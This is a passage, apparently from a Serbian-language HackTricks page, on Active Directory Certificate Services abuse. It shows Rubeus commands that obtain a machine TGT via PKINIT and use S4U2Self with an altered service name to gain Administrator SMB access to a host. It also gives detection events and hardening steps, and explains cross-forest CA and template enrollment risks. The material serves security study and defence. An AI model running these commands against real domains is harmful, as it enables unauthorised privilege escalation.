Koristi PFX za PKINIT i zadrži vraćeni computer TGT kao base64 umesto da ga odmah injectuješ:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self plus zamena servisa na istom hostu

S4U2Self omogućava servisu da dobije ticket **samom sebi** koji sadrži autorizacione podatke drugog korisnika. Uz computer TGT, Rubeus može da zatraži taj ticket za privilegovanog korisnika, promeni naziv servisa u vraćenom KRB-CRED-u u CIFS i ubaci ga. Ovo je lokalni primitive „delegate to thyself“: ne zahteva S4U2Proxy niti unos `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Zamenjena karta može da se koristi samo za servise na **istom računaru/nalogu ključa** (ovde, CIFS na `HOST`). To nije ponovo upotrebljiva Administrator karta za druge mašine u domenu. Takođe, prikazani rezultat predstavlja privilegovan SMB/filesystem pristup kao Administrator; dobijanje lokalnog `NT AUTHORITY\SYSTEM` procesa i dalje zahteva zaseban korak remote-execution.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detekcija i hardening

- Na CA-u povežite događaje Certification Services **4886** (zahtev primljen) i **4887** (izdat) za neočekivane zahteve na `Machine` template od strane IIS server naloga.<sup>[[19]](#references)[[24]](#references)</sup>
- Na DC-ovima, događaj **4768** uključuje certificate polja kada se koristi certificate pre-authentication; postavite upozorenje za neuobičajene PKINIT TGT zahteve za web-server naloge. Zatim proverite **4769** zahteve koji uključuju privilegovani impersonated identity i isti host. Pošto Rubeus `/altservice` prepisuje naziv servisa KRB-CRED-a na strani klijenta, nemojte zahtevati da naziv servisa na strani DC-a bude `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Tražite da `w3wp.exe` pristupa CA RPC endpointima, neočekivano kreiranje ASPX datoteka, Kerberos-authenticated pristup administrativnim share-ovima i aktivnosti secrets-dumping. Ograničite app-tier pristup CA RPC/KDC/SMB servisima gde je moguće i uklonite prava computer enrollment-a ili machine-authentication template-e koji nisu operativno neophodni.<sup>[[19]](#references)</sup>

## Kompromitovanje Forest-a pomoću Certificates objašnjeno u pasivu

### Razbijanje Forest Trust-ova pomoću kompromitovanih CA-ova

Konfiguracija za **cross-forest enrollment** je učinjena relativno jednostavnom. **Root CA certificate** iz resource forest-a administratori **objavljuju u account forest-ovima**, a **enterprise CA** certificates iz resource forest-a **dodaju se u `NTAuthCertificates` i AIA kontejnere u svakom account forest-u**. Preciznije, ovakav raspored daje **CA-u u resource forest-u potpunu kontrolu** nad svim ostalim forest-ovima za koje upravlja PKI-jem. Ako ovaj CA bude **kompromitovan od strane napadača**, oni bi mogli da **krivotvore** certificates za sve korisnike u resource i account forest-ovima, čime bi bezbednosna granica forest-a bila narušena.<sup>[[6]](#references)</sup>

### Enrollment privilegije dodeljene stranim principalima

U multi-forest okruženjima neophodan je oprez u vezi sa Enterprise CA-ovima koji **objavljuju certificate template-e** koji **Authenticated Users ili stranim principalima** (korisnicima/grupama van forest-a kojem Enterprise CA pripada) omogućavaju **enrollment i edit prava**.\
Prilikom authentication-a preko trust-a, AD dodaje **Authenticated Users SID** u token korisnika. Stoga, ako domen poseduje Enterprise CA sa template-om koji **Authenticated Users-ima omogućava enrollment prava**, korisnik iz drugog forest-a potencijalno može **da izvrši enrollment nad template-om**. Isto tako, ako template **izričito dodeljuje enrollment prava stranom principalu**, time se **kreira cross-forest access-control odnos**, koji principalu iz jednog forest-a omogućava da **izvrši enrollment nad template-om iz drugog forest-a**.

Oba scenarija dovode do **povećanja attack surface-a** iz jednog forest-a prema drugom. Napadač bi mogao da iskoristi podešavanja certificate template-a za dobijanje dodatnih privilegija u stranom domenu.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Tehnička analiza Certighost-a](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Zloupotreba Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, novi Authentication i Request Method-i i još mnogo toga](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Zloupotreba Key Trust Account Mapping-a za preuzimanje naloga](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Priča o Enhanced Key (mis)Usage-u](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying ka AD Certificate Services preko RPC-a](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell pristup ADCS CA-u sa YubiHSM-om](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Ne samo još jedan AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Pogrešna konfiguracija i eksploatacija](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Ponovno razmatranje „Delegate 2 Thyself“](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation od IIS AppPool-a preko AD CS RPC Endpoint-a](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Zatražena je Kerberos authentication karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Zatražena je Kerberos service karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
{{#include ../../../banners/hacktricks-training.md}}
